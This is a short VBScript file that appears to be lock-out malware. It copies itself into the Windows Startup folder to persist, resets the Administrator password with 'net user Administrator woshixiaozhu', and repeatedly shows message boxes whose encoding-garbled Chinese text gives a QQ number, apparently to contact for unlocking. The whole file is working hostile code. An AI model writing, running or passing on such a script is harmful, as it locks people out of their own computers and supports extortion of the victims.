wscript.sleep 1000*60

set fso = createobject("scripting.filesystemobject")  
set ws = createobject("wscript.shell")   
pt = ws.specialfolders("startup") & "\"
set file = fso.getfile(wscript.scriptfullname)   
file.copy pt

msgbox "�����������������ϵQQ:619699629",64,"ϵͳ��ʾ"

set oShell = wscript.CreateObject ("wscript.shell")
oShell.run "net user Administrator woshixiaozhu"
set oShell = nothing

do until i=10 
i=i+1 
msgbox "�����������������ϵQQ:619699629",16+4096,"ϵͳ��ʾ" 
wscript.sleep 1000*60*5
loop
